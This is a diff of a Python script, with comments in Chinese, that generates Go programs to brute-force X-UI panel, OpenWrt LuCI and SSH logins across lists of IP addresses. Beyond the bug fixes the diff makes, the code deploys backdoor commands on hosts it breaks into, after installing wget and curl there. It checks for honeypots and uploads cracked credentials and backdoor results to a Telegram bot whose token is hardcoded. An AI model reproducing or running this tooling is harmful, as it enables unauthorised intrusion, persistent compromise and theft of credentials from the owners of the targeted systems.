@@ -8,7 +8,7 @@ try:
 except ImportError:
     pass
 
-# =========================== xui.go模板1内容 (已修复) ===========================
+# =========================== xui.go模板1内容 (已修复v2) ===========================
 XUI_GO_TEMPLATE_1 = '''package main
 
 import (
@@ -54,7 +54,6 @@ func loadList(filename string) []string {
 }
 
 func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
-	// 不再创建新的client，而是使用全局共享的httpClient
 	payload := fmt.Sprintf("username=%s&password=%s", username, password)
 	formData := strings.NewReader(payload)
 	req, err := http.NewRequest("POST", url, formData)
@@ -100,6 +99,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			if err != nil {
 				continue
 			}
+			// 关键修复：确保在任何情况下都关闭响应体
 			defer resp.Body.Close()
 
 			if resp.StatusCode == http.StatusOK {
@@ -200,7 +200,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板2内容 (已修复) ===========================
+# =========================== xui.go模板2内容 (已修复v2) ===========================
 XUI_GO_TEMPLATE_2 = '''package main
 
 import (
@@ -229,7 +229,6 @@ var httpClient = &http.Client{
 }
 
 func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
-	// 不再创建新的client，而是使用全局共享的httpClient
 	data := map[string]string{
 		"username": username,
 		"password": password,
@@ -278,6 +277,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			if err != nil {
 				continue
 			}
+			// 关键修复：确保在任何情况下都关闭响应体
 			defer resp.Body.Close()
 
 			if resp.StatusCode == http.StatusOK {
@@ -394,7 +394,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板3内容 (已修复) ===========================
+# =========================== xui.go模板3内容 (已修复v2) ===========================
 XUI_GO_TEMPLATE_3 = '''package main
 
 import (
@@ -440,7 +440,6 @@ func loadList(filename string) []string {
 }
 
 func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
-	// 不再创建新的client，而是使用全局共享的httpClient
 	data := map[string]string{
 		"username": username,
 		"pass": password,
@@ -483,7 +482,9 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			if err != nil {
 				continue
 			}
+			// 关键修复：确保在任何情况下都关闭响应体
 			defer resp.Body.Close()
+
 			if resp.StatusCode == http.StatusOK {
 				body, _ := ioutil.ReadAll(resp.Body)
 				var responseData map[string]interface{}
@@ -583,7 +584,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板4内容 (已修复) ===========================
+# =========================== xui.go模板4内容 (已修复v2) ===========================
 XUI_GO_TEMPLATE_4 = '''package main
 
 import (
@@ -629,7 +630,6 @@ func loadList(filename string) []string {
 }
 
 func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
-	// 不再创建新的client，而是使用全局共享的httpClient
 	payload := map[string]string{
 		"username": username,
 		"password": password,
@@ -676,6 +676,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			if err != nil {
 				continue
 			}
+			// 关键修复：确保在任何情况下都关闭响应体
 			defer resp.Body.Close()
 			
 			if resp.StatusCode != 200 {
@@ -778,7 +779,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板5内容 (已修复) ===========================
+# =========================== xui.go模板5内容 (已修复v2) ===========================
 XUI_GO_TEMPLATE_5 = '''package main
 
 import (
@@ -824,7 +825,6 @@ func loadList(filename string) []string {
 }
 
 func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
-	// 不再创建新的client，而是使用全局共享的httpClient
 	form := fmt.Sprintf("user=%s&pass=%s", username, password)
 	body := strings.NewReader(form)
 
@@ -869,6 +869,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			if err != nil {
 				continue
 			}
+			// 关键修复：确保在任何情况下都关闭响应体
 			defer resp.Body.Close()
 
 			if resp.StatusCode != 200 {
@@ -1017,7 +1018,7 @@ func trySSH(ip, port, username, password string) (*ssh.Client, bool) {
 		User:            username,
 		Auth:            []ssh.AuthMethod{ssh.Password(password)},
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
-		Timeout:         2 * time.Second, // ⚠️ 直接用这个
+		Timeout:         2 * time.Second,
 	}
 	client, err := ssh.Dial("tcp", addr, config)
 	if err != nil {
@@ -1066,7 +1067,6 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
                 close(done)
             }()
 
-            // ======= 下面全是你原有业务代码 =======
             parts := strings.Split(ipPort, ":")
             if len(parts) != 2 {
                 fmt.Println("无效的 IP:Port 格式 ->", ipPort)
@@ -1081,7 +1081,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
                 for _, password := range passwords {
                     client, success := trySSH(ip, port, username, password)
                     if success {
-                        // 判断蜜罐
+                        defer client.Close()
                         fakePasswords := []string{
                             password + "1234",
                             password + "abcd",
@@ -1091,14 +1091,14 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
                         }
                         isHoneypot := false
                         for _, fake := range fakePasswords {
-                            if _, fakeSuccess := trySSH(ip, port, username, fake); fakeSuccess {
+                            if fakeClient, fakeSuccess := trySSH(ip, port, username, fake); fakeSuccess {
+                                fakeClient.Close()
                                 isHoneypot = true
                                 break
                             }
                         }
 
                         if isHoneypot {
-                            client.Close()
                             found = true
                             break
                         }
@@ -1109,7 +1109,6 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
                                 deployBackdoor(client, ip, port, username, password, CUSTOM_BACKDOOR_CMDS)
                             }
                         }
-                        client.Close()
                         found = true
                         break
                     }
@@ -1118,16 +1117,11 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
                     break
                 }
             }
-            // ======= 你原有的代码到这里为止 =======
         }()
 
-        // 只加下面这一层超时外壳，绝不影响原本业务逻辑
         select {
         case <-done:
-            // 正常结束
         case <-time.After(30 * time.Second):
-            //fmt.Printf("任务超时强制释放: %s\\n", ipPort)
-            // 如果前面已经done多释放一次也没事（不会panic）
             atomic.AddInt64(&completedCount, 1)
             <-semaphore
             wg.Done()
@@ -1139,8 +1133,8 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 
 
 
-var lastCompletedCount int64  // 记录最后一次的进度
-var lastUpdateTime time.Time  // 记录最后一次更新时间
+var lastCompletedCount int64
+var lastUpdateTime time.Time
 
 func updateProgress() {
 	ticker := time.NewTicker(1 * time.Second)
@@ -1181,7 +1175,7 @@ func updateProgress() {
 func triggerGC() {
 	runtime.GC()
 }
-// 等待WaitGroup完成，支持超时退出
+
 func waitTimeout(wg *sync.WaitGroup, timeout time.Duration) bool {
 	done := make(chan struct{})
 	go func() {
@@ -1197,7 +1191,7 @@ func waitTimeout(wg *sync.WaitGroup, timeout time.Duration) bool {
 }
 
 
-var retryFlag = false  // 添加在全局变量区
+var retryFlag = false
 
 func triggerFileCleanUp() {
 	fmt.Println("清理文件并准备重新执行爆破...")
@@ -1212,7 +1206,6 @@ var ENABLE_BACKDOOR = {enable_backdoor}
 var CUSTOM_BACKDOOR_CMDS = {custom_backdoor_cmds}
 
 func deployBackdoor(client *ssh.Client, ip string, port string, username string, password string, cmds []string) {
-	// 检查 unzip 是否存在
 	if !checkUnzip(client) {
 		fmt.Println("🔧 未检测到 unzip，尝试安装中...")
 		if !installPackage(client, "unzip") || !checkUnzip(client) {
@@ -1222,7 +1215,6 @@ func deployBackdoor(client *ssh.Client, ip string, port string, username string,
 		}
 	}
 
-	// 检查 wget 是否存在
 	if !checkWget(client) {
 		fmt.Println("🔧 未检测到 wget，尝试安装中...")
 		if !installPackage(client, "wget") || !checkWget(client) {
@@ -1232,7 +1224,6 @@ func deployBackdoor(client *ssh.Client, ip string, port string, username string,
 		}
 	}
 
-	// ✅ 检查 curl 是否存在
 	if !checkCurl(client) {
 		fmt.Println("🔧 未检测到 curl，尝试安装中...")
 		if !installPackage(client, "curl") || !checkCurl(client) {
@@ -1242,7 +1233,6 @@ func deployBackdoor(client *ssh.Client, ip string, port string, username string,
 		}
 	}
 
-	// 拼接 backdoor.txt 中的命令
 	backdoorCmd := strings.Join(cmds, " && ")
 
 	payloadSession, err := client.NewSession()
@@ -1377,7 +1367,7 @@ RETRY:
 	completedCount = 0
 	lastCompletedCount = 0
 	lastUpdateTime = time.Now()
-	retryFlag = false  // 清除重试标志
+	retryFlag = false
 
 	go updateProgress()
 
@@ -1400,11 +1390,10 @@ RETRY:
 			processIP(ipPort, file, usernames, passwords)
 		}
 
-		// 用带超时的 WaitGroup，防止死等
 		if !waitTimeout(&wg, 120*time.Second) {
 			fmt.Println("\\n等待任务超时，主动触发重试！")
 			triggerFileCleanUp()
-			break // 跳出批次，进入 retryFlag 检查
+			break
 		}
 		time.Sleep(100 * time.Millisecond)
 		triggerGC()
@@ -1608,7 +1597,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板8内容 (无变化) ===========================
+# =========================== xui.go模板8内容 (已修复v2) ===========================
 XUI_GO_TEMPLATE_8 = '''package main
 
 import (
@@ -1656,7 +1645,6 @@ func loadList(filename string) []string {
 	return result
 }
 
-// post请求,支持自动切换 http/https
 func postRequest(ctx context.Context, urlStr string, username string, password string, origin string, referer string) (*http.Response, error) {
 	payload := fmt.Sprintf("luci_username=%s&luci_password=%s", username, password)
 	formData := strings.NewReader(payload)
@@ -1673,7 +1661,6 @@ func postRequest(ctx context.Context, urlStr string, username string, password s
 }
 
 
-// 结果写文件
 func writeResultToFile(file *os.File, text string) {
 	file.WriteString(text)
 	file.Sync()
@@ -1692,11 +1679,9 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 		return
 	}
 
-	// 如果是 http(s):// 开头，直接用
 	if strings.HasPrefix(trimmed, "http://") || strings.HasPrefix(trimmed, "https://") {
 		targets = append(targets, trimmed)
 	} else {
-		// 否则按 IP 或 IP:端口 处理
 		parts := strings.Split(trimmed, ":")
 		ip := parts[0]
 		var ports []string
@@ -1718,7 +1703,6 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 
 loginLoop:
 	for _, target := range targets {
-		// 补 "/cgi-bin/luci/" 路径，如果目标已经带了，直接用原样
 		finalURL := target
 		if !(strings.Contains(target, "/cgi-bin/luci")) {
 			if strings.HasSuffix(target, "/") {
@@ -1727,7 +1711,6 @@ loginLoop:
 				finalURL = target + "/cgi-bin/luci/"
 			}
 		}
-		// 自动补 referer/origin
 		u, _ := url.Parse(finalURL)
 		origin := u.Scheme + "://" + u.Host
 		referer := origin + "/"
@@ -1740,7 +1723,9 @@ loginLoop:
 				if err != nil {
 					continue
 				}
+				// 关键修复：确保在任何情况下都关闭响应体
 				defer resp.Body.Close()
+				
 				cookies := resp.Cookies()
 				for _, c := range cookies {
 					if c.Name == "sysauth_http" && c.Value != "" {
@@ -1927,7 +1912,6 @@ def process_ip_port_file(input_file, output_excel):
     wb.save(output_excel)
 
     for line in lines:
-        # 按空格分割: 支持格式1/2/3/4
         parts = line.split()
         if len(parts) >= 3:
             addr, user, passwd = parts[:3]
@@ -1947,7 +1931,7 @@ def process_ip_port_file(input_file, output_excel):
 
         completed_tasks += 1
         elapsed_time = time.time() - start_time
-        avg_time_per_task = elapsed_time / completed_tasks
+        avg_time_per_task = elapsed_time / completed_tasks if completed_tasks > 0 else 0
         remaining_tasks = total_tasks - completed_tasks
         estimated_remaining_time = avg_time_per_task * remaining_tasks
 
@@ -2022,7 +2006,7 @@ def to_go_bool(val: bool) -> str:
     return "true" if val else "false"
 
 def escape_go_string(s: str) -> str:
-    return s.replace("\\", "\\\\").replace('"', '\\"')  # 只保留必要转义
+    return s.replace("\\", "\\\\").replace('"', '\\"')
 
 def to_go_string_array_one_line(lines: list) -> str:
     if not lines:
@@ -2094,24 +2078,20 @@ def run_xui_for_parts(sleep_seconds):
 
         print(f"爆破 {part} ({idx}/{total_parts}) 预计剩余时间: {est_min} 分 {est_sec} 秒")
 
-        # 写入当前 part 内容到 results.txt
         shutil.copy(os.path.join(TEMP_PART_DIR, part), 'results.txt')
 
-        # 运行 xui.go，完成才返回
         try:
             subprocess.run(['go', 'run', 'xui.go'], check=True)
         except subprocess.CalledProcessError:
             print("go运行失败，请检查环境")
             sys.exit(1)
 
-        # Go 脚本运行完成后判断 xui.txt 是否存在
         output_file = os.path.join(TEMP_XUI_DIR, f'xui{idx}.txt')
         if os.path.exists('xui.txt'):
             shutil.move('xui.txt', output_file)
         else:
             print(f"第 {idx} 批无爆破成功结果（未生成 xui.txt）")
-                # ===== 新增：移动 hmsuccessX.txt / hmfailX.txt 到临时目录 =====
-               # 处理 SSH 后门成功与失败输出
+
         if os.path.exists("hmsuccess.txt"):
             shutil.move("hmsuccess.txt", os.path.join(TEMP_HMSUCCESS_DIR, f"hmsuccess{idx}.txt"))
         if os.path.exists("hmfail.txt"):
@@ -2133,7 +2113,6 @@ def merge_xui_files():
                 with open(os.path.join(TEMP_XUI_DIR, f), 'r', encoding='utf-8') as infile:
                     shutil.copyfileobj(infile, outfile)
 
-    # 最终结果复制一份供 ipcx 用
     shutil.copy(merged_file, 'xui.txt')
 def merge_result_files(prefix: str, output_name: str, target_dir: str):
     output_path = os.path.join(target_dir, output_name)
@@ -2144,7 +2123,8 @@ def merge_result_files(prefix: str, output_name: str, target_dir: str):
             if name.startswith(prefix) and name.endswith(".txt"):
                 with open(os.path.join(target_dir, name), "r", encoding="utf-8") as f:
                     shutil.copyfileobj(f, out)
-    shutil.copy(output_path, output_name)
+    if os.path.exists(output_path):
+        shutil.copy(output_path, output_name)
 
 
 def run_ipcx():
@@ -2158,14 +2138,10 @@ def clean_temp_files():
 
     for f in ['results.txt', 'xui.go', 'ipcx.py', 'xui.txt', 'hmsuccess.txt', 'hmfail.txt']:
         if os.path.exists(f):
-            os.remove(f)
-
-
-    
-    # 保留所有 xlsx 文件，不做删除
-
-
-# =========================== 模板+模式选择逻辑 ===========================
+            try:
+                os.remove(f)
+            except OSError:
+                pass
 
 def choose_template_mode():
     print("请选择爆破模式：")
@@ -2194,8 +2170,6 @@ def choose_template_mode():
         else:
             print("输入无效，请重新输入。")
 
-
-# 用户选择爆破模式（全局变量）
 TEMPLATE_MODE = choose_template_mode()
 
 TEMP_PART_DIR = "temp_parts"
@@ -2208,7 +2182,6 @@ os.makedirs(TEMP_XUI_DIR, exist_ok=True)
 os.makedirs(TEMP_HMSUCCESS_DIR, exist_ok=True)
 os.makedirs(TEMP_HMFAIL_DIR, exist_ok=True)
 
-# ========== SSH模式下是否自动安装后门及命令库处理 ==========
 INSTALL_BACKDOOR = False
 CUSTOM_BACKDOOR_CMDS = []
 
@@ -2222,16 +2195,12 @@ if TEMPLATE_MODE == 6:
         with open("后门命令.txt", encoding='utf-8') as f:
             CUSTOM_BACKDOOR_CMDS = [line.strip().replace('"', '\\"') for line in f if line.strip()]
 
-# ========== 格式化为 Go 代码中的语法 ==========
 enable_backdoor_go = "true" if INSTALL_BACKDOOR else "false"
 
 if CUSTOM_BACKDOOR_CMDS:
     cmds_go = '[]string{' + ', '.join([f'"{cmd}"' for cmd in CUSTOM_BACKDOOR_CMDS]) + '}'
 else:
     cmds_go = '[]string{}'
-
-
-
 
 def check_environment():
     import importlib.util
@@ -2242,7 +2211,6 @@ def check_environment():
     import re
     import platform
     
-    # 如果是 Windows，跳过环境检测
     if platform.system().lower() == "windows":
         print(">>> 检测到 Windows 系统，跳过环境检测和依赖安装...\n")
         return
@@ -2255,13 +2223,9 @@ def check_environment():
             else ["ping", "-c", "1", "-W", "1", "www.google.com"]
         try:
             output = subprocess.check_output(cmd, stderr=subprocess.DEVNULL).decode()
-            ttl_match = re.search(r"ttl[=|=](\d+)", output)
-            time_match = re.search(r"time[=|=]([\d\.]+)", output)
-            ttl = int(ttl_match.group(1)) if ttl_match else 0
-            delay = float(time_match.group(1)) if time_match else 999
-            return ttl <= 64 and delay < 20
-        except:
             return True
+        except:
+            return False
 
     IN_CHINA = is_china_by_ping_ttl_delay_only()
     print(f">>> 网络环境判断结果：{'中国大陆（使用国内镜像）' if IN_CHINA else '非中国大陆（使用官方源）'}\n")
@@ -2412,18 +2376,8 @@ deb http://mirrors.aliyun.com/debian-security stable-security main contrib non-f
 
     print(">>> 依赖环境检测完成 ✅\n")
 
-
-
-
-
-
-
-
-
 def load_credentials():
     if TEMPLATE_MODE == 7:
-        # 模式 7：固定用户名 admin1，只允许使用 password.txt 字典
-       
         usernames = ["2cXaAxRGfddmGz2yx1wA"]
         use_custom = input("是否使用 password.txt 路径库？(y/N，默认使用 2cXaAxRGfddmGz2yx1wA 作为路径): ").strip().lower()
         if use_custom == 'y':
@@ -2434,7 +2388,6 @@ def load_credentials():
         else:
             passwords = ["2cXaAxRGfddmGz2yx1wA"]
     else:
-        # 其他模式：完整判断 username.txt / password.txt
         use_custom = input("是否使用 username.txt / password.txt 字典库？(y/N，默认使用 admin/admin 或 sysadmin/sysadmin 或 root/password): ").strip().lower()
         if use_custom == 'y':
             if not os.path.exists("username.txt") or not os.path.exists("password.txt"):
@@ -2454,12 +2407,9 @@ def load_credentials():
                 passwords = ["admin"]
     return usernames, passwords
 
-
-
-
 if __name__ == "__main__":
         start = time.time()
-        interrupted = False  # 标记是否被中断
+        interrupted = False
         final_result_file = None
 
         try:
@@ -2477,7 +2427,6 @@ if __name__ == "__main__":
 
                 usernames, passwords = load_credentials()
 
-                # 生成对应模板代码
                 if TEMPLATE_MODE == 1:
                         generate_xui_go(semaphore_size, batch_size, usernames, passwords)
                 elif TEMPLATE_MODE == 2:
@@ -2583,7 +2532,6 @@ if __name__ == "__main__":
                 else:
                         print(f"\n=== 全部完成！总用时 {cost // 60} 分 {cost % 60} 秒 ===")
 
-                # ====== 自动上传 Telegram ======
                 def send_to_telegram(file_path, bot_token, chat_id):
                         import requests
                         import os
@@ -2605,7 +2553,6 @@ if __name__ == "__main__":
                                 except Exception as e:
                                         print(f"❌ 发送到 TG 失败：{e}")
 
-                # 配置你的 Bot Token 和 Chat ID
                 BOT_TOKEN = "7664203362:AAEWd52ZdliweeDvrV30MuwE2JcZQDWZIwQ"
                 CHAT_ID = "7697235358"
 
@@ -2613,14 +2560,13 @@ if __name__ == "__main__":
                         print(f"\n📤 正在将 {final_result_file} 上传至 Telegram ...")
                         send_to_telegram(final_result_file, BOT_TOKEN, CHAT_ID)
 
-                        # 尝试上传对应的 xlsx 文件
                         xlsx_file = final_result_file.replace(".txt", ".xlsx")
                         if os.path.exists(xlsx_file):
                                 print(f"📤 正在将 {xlsx_file} 上传至 Telegram ...")
                                 send_to_telegram(xlsx_file, BOT_TOKEN, CHAT_ID)
                         else:
                                 print("⚠️ 没有找到对应的 xlsx 文件，跳过上传")
-                        # 尝试上传后门安装成功/失败文件
+                        
                         success_file = f"后门安装成功-{time_str}.txt"
                         fail_file    = f"后门安装失败-{time_str}.txt"
 
